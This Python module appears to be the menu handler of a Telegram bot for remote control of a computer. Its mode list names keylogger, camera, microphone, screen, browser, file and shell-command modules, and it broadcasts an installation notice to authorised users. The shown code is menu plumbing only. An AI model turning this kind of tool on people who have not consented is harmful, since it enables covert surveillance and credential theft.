import constants
from command_registry import registry
from utils import getarg, getMarkupModes, validate_time_argument, create_menu_markup, send_message
from modules import Permissions
import asyncio


async def menu_callback(bot, call):
    markup = getMarkupModes(modes, is_main=1)

    await send_message(bot, call.message.chat.id, text=constants.menu_greeting_message, reply_markup=markup)


@registry.register(
    command_name=constants.MENU_command,
    permission_name=constants.MENU,
)
async def menu(bot, message):
    markup = getMarkupModes(modes, is_main=1)

    await send_message(bot, message.chat.id, text=constants.menu_greeting_message, reply_markup=markup)


async def installation_notification(bot):
    permissions = Permissions.get()

    markup = getMarkupModes()

    for ID, value in permissions.items():
        ID_permissions = value['permissions']

        if len(ID_permissions['allowed']) == 0:
            continue

        try:
            await send_message(bot, ID, text=constants.installation_notification,
                               reply_markup=markup)
        except:
            pass

        await asyncio.sleep(0.2)


modes = {constants.ADMIN_preview: constants.ADMIN,
         constants.MOUSE_preview: constants.MOUSE,
         constants.CAMERA_preview: constants.CAMERA,
         constants.MICROPHONE_preview: constants.MICROPHONE,
         constants.WIFI_preview: constants.WIFI,
         constants.SYSTEM_preview: constants.SYSTEM,
         constants.BROWSER_preview: constants.BROWSER,
         constants.PHOTO_preview: constants.PHOTO,
         constants.FILE_preview: constants.FILE,
         constants.KEYBOARD_preview: constants.KEYBOARD,
         constants.KEYLOGGER_preview: constants.KEYLOGGER,
         constants.SCREEN_preview: constants.SCREEN,
         constants.COMMAND_preview: constants.COMMAND,
         constants.ABOUT_preview: constants.ABOUT}
